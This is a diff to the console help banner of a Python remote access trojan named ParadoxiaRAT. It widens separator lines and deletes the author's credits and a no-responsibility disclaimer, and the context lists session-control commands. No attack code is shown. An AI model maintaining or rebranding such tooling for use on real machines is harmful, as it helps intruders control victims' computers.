@@ -869,7 +869,7 @@ def Console():
                     print(Style.BRIGHT + Fore.GREEN + 
                         """
                         ParadoxiaRAT
-                        ---------------
+                        ---------------------------------------------------------------------
                         -> Commands : 
                         -. help - Print this help message.
                         -. sessions - View online clients.
@@ -879,15 +879,7 @@ def Console():
                         -. kill - Kill session.
                         -. exit - Exit.
                         Use the help command inside a session to view Session specific help.
-                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
-                        Created by : QuantumCore (Fahad) 
-                        Website : https://quantumcored.com
-                        Email : quantumcore@protonmail.com
-                        Discord : https://discordapp.com/invite/8snh7nx
-                        Github Repository : https://github.com/quantumcored/paradoxia
-                        If you find any bugs, Please Report them here : https://github.com/quantumcored/paradoxia/issues
-                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
-                        The Developer is not responsible for any misuse of Damage caused by the program. This is created only to innovate Information Security and YOU.
+                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
                         """
                         + Style.RESET_ALL)
                 elif(x == "build"):
